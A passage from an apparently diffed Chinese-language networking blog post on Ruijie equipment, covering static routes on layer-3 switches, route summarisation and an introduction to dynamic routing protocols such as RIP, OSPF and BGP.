-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
-<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
-<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
-<li>在两台三层交换机上配置静态路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
-SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface vlan 800
-SW1(config-if)#ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#vlan 800
-SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface vlan 800
-SW2(config-if)#ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关</li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由-1"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由-1" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface GigabitEthernet 0&#x2F;5
-SW1(config-if)#no switchport
-SW1(config-if)# ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
-SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
-SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
-SW2(config)#interface vlan 40
-SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
-SW2(config)#interface GigabitEthernet 0&#x2F;5
-SW2(config-if)#no switchport
-SW2(config-if)# ip address 10.0.0.2 255.255.255.252
-SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
-SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
-
-<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
-<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
-<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
-<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
-<ul>
-<li>配置R1路由器</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
-<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
-<li>在特定场景下，才可实施路由汇总</li>
-<li>在以下的场景中，在R2上不能做路由汇总</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
-<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
-<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
-<ul>
-<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
-<li>RIP基于UDP，端口号520 </li>
-<li>OSPF基于IP，协议号89 </li>
-<li>BGP基于TCP，端口号179</li>
-</ul>
-</li>
-<li>路由协议工作机制的四个主要步骤： <ul>
-<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
-<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
-<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
-<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
-</ul>
-</li>
-</ul>
-<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
-<li>衡量路由协议的主要指标 <ul>
-<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
-<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
-<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
-<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
-<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
-<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
-<li>按照管理范围分类 <ul>
-<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
-<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
-</ul>
-</li>
-<li>按照算法分类 <ul>
-<li>距离矢量路由协议：RIP、BGP </li>
-<li>链路状态路由协议：OSPF、IS-IS</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
-<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
-<li>路由以矢量（距离、方向）的方式通告出去</li>
-<li>距离矢量协议直接传送各自的路由表信息 <ul>
-<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
-<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
-<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
-<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
-<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
-<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
-<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
-<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
